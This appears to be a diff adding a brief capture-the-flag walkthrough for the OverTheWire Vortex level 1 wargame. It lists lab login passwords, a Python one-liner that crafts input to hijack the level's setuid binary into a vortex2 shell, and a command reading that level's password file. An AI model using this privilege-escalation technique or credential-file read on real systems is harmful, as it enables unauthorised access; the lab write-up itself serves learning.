@@ -1,0 +1,20 @@
+ssh into vortex1@vortex.labs.overthewire.org
+
+password: Gq#qu3bF3
+
+Type:
+python -c 'print "\\" * 0x105 + "\xca" + "_"' > /tmp/Gourd_is_31337  
+cat /tmp/Gourd_is_31337 - | /vortex/vortex1
+
+Type:
+whoami
+
+You will discover that you're in a shell with vortex2 permissions. Perfect.
+
+Type:
+cat /etc/vortex_pass/vortex2
+
+This will print the password for vortex2@vortex.labs.overthewire.org.
+23anbT\rE
+
+Ctrl + C and Ctrl + D to clean up
